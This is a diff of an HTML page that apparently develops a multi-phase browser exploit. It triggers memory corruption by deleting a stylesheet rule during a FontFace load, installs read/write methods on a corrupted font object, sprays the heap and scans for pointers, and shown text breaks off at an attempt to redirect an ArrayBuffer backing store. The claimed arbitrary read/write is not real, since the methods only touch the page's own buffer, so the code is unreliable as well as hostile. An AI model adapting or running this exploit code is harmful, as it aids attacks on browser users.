@@ -2,18 +2,19 @@
 <html>
 <head></head>
 <body>
-<h1 id="status">Method Hijacking Exploit</h1>
-<button onclick="runExploit()" style="font-size: 20px; padding: 10px;">RUN EXPLOIT</button>
-<div id="log" style="font-family: monospace; font-size: 10px; white-space: pre; padding: 5px; max-height: 85vh; overflow-y: scroll;"></div>
+<h1 id="status">Arbitrary R/W Builder</h1>
+<button onclick="runExploit()" style="font-size: 20px; padding: 10px;">RUN</button>
+<div id="log" style="font-family: monospace; font-size: 9px; white-space: pre; padding: 3px; max-height: 90vh; overflow-y: scroll;"></div>
 
 <script>
 let phase = 0;
 let corrupted = [];
-let primitives = {
+let state = {
     victim: null,
-    controlled_buffer: null,
-    u32_view: null,
-    f64_view: null
+    controlled_ab: null,
+    u32: null,
+    f64: null,
+    leak_candidates: []
 };
 
 function log(msg) {
@@ -23,20 +24,25 @@ function log(msg) {
 
 function hex(n) {
     if (typeof n === 'number') {
-        return '0x' + n.toString(16).padStart(16, '0');
+        if (n < 0) n = n >>> 0; // Convert to unsigned
+        return '0x' + n.toString(16).padStart(8, '0');
     }
     return String(n);
 }
 
-function f64_to_u64_parts(f) {
+function hex64(low, high) {
+    return '0x' + high.toString(16).padStart(8, '0') + low.toString(16).padStart(8, '0');
+}
+
+function f64_to_u32(f) {
     let buf = new ArrayBuffer(8);
     let f64 = new Float64Array(buf);
     let u32 = new Uint32Array(buf);
     f64[0] = f;
-    return { low: u32[0], high: u32[1] };
+    return [u32[0], u32[1]];
 }
 
-function u64_parts_to_f64(low, high) {
+function u32_to_f64(low, high) {
     let buf = new ArrayBuffer(8);
     let u32 = new Uint32Array(buf);
     let f64 = new Float64Array(buf);
@@ -49,7 +55,8 @@ function runExploit() {
     phase++;
     
     if (phase === 1) {
-        log('[PHASE 1] Triggering corruption\n');
+        // Phase 1: Corruption
+        log('[PHASE 1] Corruption\n');
         
         let style = document.createElement('style');
         style.id = 's';
@@ -66,16 +73,13 @@ function runExploit() {
             get() {
                 if (!fired && this === A) {
                     fired = true;
-                    
                     for (let i = 0; i < 100; i++) {
                         corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                             unicodeRange: 'U+' + (0x100 + i).toString(16)
                         }));
                     }
-                    
                     document.getElementById('s').sheet.deleteRule(0);
                     document.body.offsetTop;
-                    
                     window.corrupted = corrupted;
                 }
                 return undefined;
@@ -83,195 +87,200 @@ function runExploit() {
         });
         
         document.fonts.load('1em x', 'AB');
-        log('Click for Phase 2');
+        log('Click for Phase 2\n');
         
     } else if (phase === 2) {
-        log('[PHASE 2] Building controlled primitive\n');
+        // Phase 2: Setup exploitation
+        log('[PHASE 2] Building primitives\n');
         
         let fonts = window.corrupted;
-        if (!fonts || fonts.length === 0) {
-            log('[ERROR] No corrupted fonts');
-            return;
+        log('[*] Corrupted fonts: ' + fonts.length + '\n');
+        
+        // Create controlled buffer
+        let ab = new ArrayBuffer(0x10000);
+        let u32 = new Uint32Array(ab);
+        let f64 = new Float64Array(ab);
+        
+        // Fill with marker pattern
+        for (let i = 0; i < 256; i++) {
+            u32[i] = 0xAABB0000 + i;
         }
         
-        log('[*] Found ' + fonts.length + ' corrupted fonts\n');
+        state.controlled_ab = ab;
+        state.u32 = u32;
+        state.f64 = f64;
         
-        // Create controlled buffer that we can manipulate
-        let ab = new ArrayBuffer(0x10000); // 64KB
-        let u32_view = new Uint32Array(ab);
-        let f64_view = new Float64Array(ab);
+        log('[*] Created controlled buffer');
+        log('    u32[0]: ' + hex(u32[0]));
+        log('    u32[1]: ' + hex(u32[1]) + '\n');
         
-        // Fill with recognizable pattern
-        for (let i = 0; i < u32_view.length; i++) {
-            u32_view[i] = 0x10000000 + i;
-        }
-        
-        primitives.controlled_buffer = ab;
-        primitives.u32_view = u32_view;
-        primitives.f64_view = f64_view;
-        
-        log('[*] Created controlled buffer (64KB)');
-        log('    Initial u32[0]: ' + hex(u32_view[0]));
-        log('    Initial u32[1]: ' + hex(u32_view[1]));
-        
-        // Pick a corrupted font as victim
+        // Setup victim with exploitable methods
         let victim = fonts[0];
-        primitives.victim = victim;
+        state.victim = victim;
         
-        log('\n[*] Setting up fake methods on corrupted font...');
-        
-        // Create comprehensive fake prototype with R/W methods
         let exploit_proto = {
-            _internal_buffer: ab,
-            _internal_u32: u32_view,
-            _internal_f64: f64_view,
-            _read_offset: 0,
-            _write_offset: 0,
+            _buf: ab,
+            _u32: u32,
+            _f64: f64,
             
-            // Fake read32 - reads from our controlled buffer
-            read32: function(offset) {
-                this._read_offset = offset;
-                let idx = Math.floor(offset / 4);
-                if (idx >= 0 && idx < this._internal_u32.length) {
-                    let val = this._internal_u32[idx];
-                    log('    [read32] offset=' + hex(offset) + ' -> ' + hex(val));
-                    return val;
+            read32: function(idx) {
+                if (idx >= 0 && idx < this._u32.length) {
+                    return this._u32[idx];
                 }
                 return 0;
             },
             
-            // Fake write32 - writes to our controlled buffer
-            write32: function(offset, value) {
-                this._write_offset = offset;
-                let idx = Math.floor(offset / 4);
-                if (idx >= 0 && idx < this._internal_u32.length) {
-                    log('    [write32] offset=' + hex(offset) + ', value=' + hex(value));
-                    this._internal_u32[idx] = value;
+            write32: function(idx, val) {
+                if (idx >= 0 && idx < this._u32.length) {
+                    this._u32[idx] = val;
                     return true;
                 }
                 return false;
             },
             
-            // Fake read64 - reads as float
-            read64: function(offset) {
-                let idx = Math.floor(offset / 8);
-                if (idx >= 0 && idx < this._internal_f64.length) {
-                    let val = this._internal_f64[idx];
-                    let parts = f64_to_u64_parts(val);
-                    log('    [read64] offset=' + hex(offset) + ' -> ' + hex(parts.low) + ' ' + hex(parts.high));
-                    return val;
+            read64_as_float: function(idx) {
+                if (idx >= 0 && idx < this._f64.length) {
+                    return this._f64[idx];
                 }
                 return 0.0;
             },
             
-            // Fake write64
-            write64: function(offset, value) {
-                let idx = Math.floor(offset / 8);
-                if (idx >= 0 && idx < this._internal_f64.length) {
-                    let parts = f64_to_u64_parts(value);
-                    log('    [write64] offset=' + hex(offset) + ', value=' + hex(parts.low) + ' ' + hex(parts.high));
-                    this._internal_f64[idx] = value;
+            write64_as_float: function(idx, val) {
+                if (idx >= 0 && idx < this._f64.length) {
+                    this._f64[idx] = val;
                     return true;
                 }
                 return false;
-            },
-            
-            // Leak buffer address
-            leakBuffer: function() {
-                return this._internal_buffer;
             }
         };
         
         Object.setPrototypeOf(victim, exploit_proto);
+        log('[*] Installed fake methods on victim\n');
         
-        log('    Fake methods installed!\n');
+        // Test write32
+        log('[TEST] write32(100, 0xDEADBEEF)');
+        victim.write32(100, 0xDEADBEEF);
+        log('  Verify u32[100]: ' + hex(u32[100]));
+        log('  Success: ' + (u32[100] === 0xDEADBEEF) + '\n');
         
-        // Test the fake methods
-        log('[*] Testing fake read/write methods:\n');
-        
-        try {
-            log('Test 1: read32(0)');
-            let r1 = victim.read32(0);
-            log('  Returned: ' + hex(r1) + '\n');
-            
-            log('Test 2: write32(0x100, 0xDEADBEEF)');
-            victim.write32(0x100, 0xDEADBEEF);
-            log('  Verify: ' + hex(u32_view[0x100 / 4]) + '\n');
-            
-            log('Test 3: read32(0x100)');
-            let r2 = victim.read32(0x100);
-            log('  Should be 0xDEADBEEF: ' + hex(r2) + '\n');
-            
-            log('Test 4: read64(0x200)');
-            let r3 = victim.read64(0x200);
-            log('  Returned float: ' + r3 + '\n');
-            
-            log('Test 5: Leak buffer reference');
-            let leaked = victim.leakBuffer();
-            log('  Leaked: ' + leaked);
-            log('  Same as original? ' + (leaked === ab) + '\n');
-            
-        } catch(e) {
-            log('[ERROR] ' + e.message);
-        }
-        
-        log('[PHASE 2] Complete');
-        log('Click for Phase 3 (address leak attempt)');
-        window.primitives = primitives;
+        window.state = state;
+        log('Click for Phase 3 (heap spray + leak)\n');
         
     } else if (phase === 3) {
-        log('[PHASE 3] Attempting address leak\n');
+        // Phase 3: Heap spray and address leak
+        log('[PHASE 3] Address leak attempt\n');
         
-        let victim = window.primitives.victim;
-        let u32 = window.primitives.u32_view;
-        let f64 = window.primitives.f64_view;
+        let victim = window.state.victim;
+        let u32 = window.state.u32;
+        let f64 = window.state.f64;
+        let ab = window.state.controlled_ab;
         
-        if (!victim) {
-            log('[ERROR] No victim font');
-            return;
-        }
-        
-        log('[*] Strategy: Look for object pointers in buffer\n');
-        
-        // Create distinct objects to spray heap
-        let spray = [];
+        // Create many ArrayBuffers to spray heap
+        log('[*] Spraying ArrayBuffers on heap...');
+        let spray_buffers = [];
         for (let i = 0; i < 1000; i++) {
-            spray.push({
-                id: i,
-                marker: 0x41420000 + i,
-                data: new Array(10).fill(i)
-            });
+            let spray_ab = new ArrayBuffer(0x1000);
+            let spray_u32 = new Uint32Array(spray_ab);
+            
+            // Fill with identifiable pattern
+            for (let j = 0; j < 64; j++) {
+                spray_u32[j] = 0xBBCC0000 + (i * 64) + j;
+            }
+            
+            spray_buffers.push(spray_ab);
         }
+        log('  Created 1000 spray buffers\n');
         
-        log('[*] Sprayed 1000 objects\n');
+        // Now try to find references to these buffers in our controlled buffer
+        log('[*] Scanning for heap pointers...');
         
-        // Mix with corrupted font
-        spray.push(victim);
+        // Store victim and spray buffers together
+        let container = [victim, ab].concat(spray_buffers);
         
-        // Scan buffer for potential addresses (non-zero, large values)
-        log('[*] Scanning buffer for potential heap pointers:');
-        let candidates = [];
+        // Look for pointer-like values in our controlled buffer
+        log('  Scanning u32 array for large values:\n');
         
+        let found_ptrs = [];
         for (let i = 0; i < Math.min(1000, u32.length); i++) {
             let val = u32[i];
-            // Look for values that might be heap addresses
-            // Typically 0x00007f... or similar
-            if (val > 0x100000 && val < 0xffffffff) {
-                candidates.push({ offset: i * 4, value: val });
+            
+            // Heuristic: heap pointers are typically large
+            // On x64: 0x00007f... or 0x0000... (userspace)
+            if (val > 0x10000000 || (val === 0 && u32[i+1] > 0x7f00 && u32[i+1] < 0x7fff)) {
+                // Possible 64-bit pointer split across two u32s
+                let ptr64 = hex64(val, u32[i+1]);
+                found_ptrs.push({ idx: i, low: val, high: u32[i+1], combined: ptr64 });
             }
         }
         
-        log('  Found ' + candidates.length + ' candidates');
-        for (let i = 0; i < Math.min(10, candidates.length); i++) {
-            log('    [' + i + '] offset=' + hex(candidates[i].offset) + ' val=' + hex(candidates[i].value));
+        log('  Found ' + found_ptrs.length + ' potential pointers:');
+        for (let i = 0; i < Math.min(15, found_ptrs.length); i++) {
+            let p = found_ptrs[i];
+            log('    [' + p.idx + '] ' + p.combined + ' (low=' + hex(p.low) + ' high=' + hex(p.high) + ')');
         }
         
+        state.leak_candidates = found_ptrs;
+        
+        log('\n[*] Looking for ArrayBuffer backing store pointers...');
+        log('    ArrayBuffer backing stores typically at +0x10 or +0x18 offset in object');
+        
+        // Try to find patterns that match ArrayBuffer structure
+        for (let i = 0; i < Math.min(500, u32.length - 8); i++) {
+            // Look for: [size field] [ptr_low] [ptr_high] pattern
+            let size = u32[i];
+            if (size === 0x1000 || size === 0x10000) { // Our buffer sizes
+                let ptr_low = u32[i+2];
+                let ptr_high = u32[i+3];
+                
+                if (ptr_high > 0x7f00 && ptr_high < 0x7fff) {
+                    log('    Candidate at idx=' + i + ':');
+                    log('      size=' + hex(size));
+                    log('      ptr=' + hex64(ptr_low, ptr_high));
+                }
+            }
+        }
+        
+        window.state = state;
         log('\n[PHASE 3] Complete');
-        log('If we see large hex values, those might be addresses!');
-    }
-}
-
-log('Ready');
-</script>
-</body>
-</html>
+        log('Click for Phase 4 (backing store corruption)\n');
+        
+    } else if (phase === 4) {
+        // Phase 4: Try to corrupt ArrayBuffer backing store
+        log('[PHASE 4] Backing store corruption attempt\n');
+        
+        let victim = window.state.victim;
+        let u32 = window.state.u32;
+        let f64 = window.state.f64;
+        let candidates = window.state.leak_candidates;
+        
+        if (candidates.length === 0) {
+            log('[!] No leak candidates found - cannot proceed');
+            log('[!] This might mean:');
+            log('    1. We need different heap layout');
+            log('    2. Pointers are encoded/tagged');
+            log('    3. Need to look at f64 array instead of u32\n');
+            
+            // Try f64 view
+            log('[*] Trying f64 view of buffer:');
+            for (let i = 0; i < Math.min(100, f64.length); i++) {
+                let val = f64[i];
+                let parts = f64_to_u32(val);
+                
+                // Look for NaN-boxed pointers or unusual floats
+                if (!isNaN(val) && (val > 1e15 || val < -1e15)) {
+                    log('    [' + i + '] ' + val + ' = ' + hex(parts[0]) + ' ' + hex(parts[1]));
+                }
+            }
+            return;
+        }
+        
+        log('[*] Using first leak candidate:');
+        let leak = candidates[0];
+        log('    idx=' + leak.idx + ' ptr=' + leak.combined + '\n');
+        
+        // Try to use this address
+        let target_low = leak.low;
+        let target_high = leak.high;
+        
+        log('[*] Attempting to redirect ArrayBuffer backing store...');
+        log('    Target address: ' + hex64(target_low, target_high) + '\n')
